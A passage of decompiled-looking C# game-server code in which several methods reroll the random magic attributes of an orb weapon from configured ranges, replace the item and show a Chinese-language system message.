						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠武器高级属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠武器高级属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠武器稀有属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠武器稀有属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
